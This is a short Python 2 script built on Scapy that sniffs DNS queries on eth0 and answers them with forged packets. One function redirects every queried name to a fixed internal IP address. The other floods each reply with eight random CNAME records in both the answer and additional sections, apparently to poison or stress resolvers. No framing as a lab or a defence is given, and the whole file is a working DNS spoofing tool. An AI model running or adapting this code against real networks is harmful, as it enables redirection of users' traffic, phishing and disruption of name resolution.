from scapy.all import *
import uuid

def dns_spoof1(pkt):
    redirect_to = '172.16.1.63'
    if pkt.haslayer(DNSQR): # DNS question record
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=0, rdata=redirect_to))
        send(spoofed_pkt)
        print 'Sent:', spoofed_pkt.summary()


import socket
import fcntl
import struct

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def genresponse(pkt):
	return str(uuid.uuid4().get_hex().upper()[0:32])+"."+str(uuid.uuid4().get_hex().upper()[0:32])+"."+pkt[DNS].qd.qname

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR): # DNS question record
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 8, qr=1, arcount=8, \
			an= (
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))
			),
		 	ar = (
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))/ \
				DNSRR(rrname=pkt[DNS].qd.qname, type=5, ttl=0, rdata=genresponse(pkt))
			)
		      )
        send(spoofed_pkt, verbose=0)
        print 'Sent:', repr(spoofed_pkt), spoofed_pkt.summary()

myip = get_ip_address('eth0')
sniff(filter='udp port 53 and dst host '+myip, iface='eth0', store=0, prn=dns_spoof)

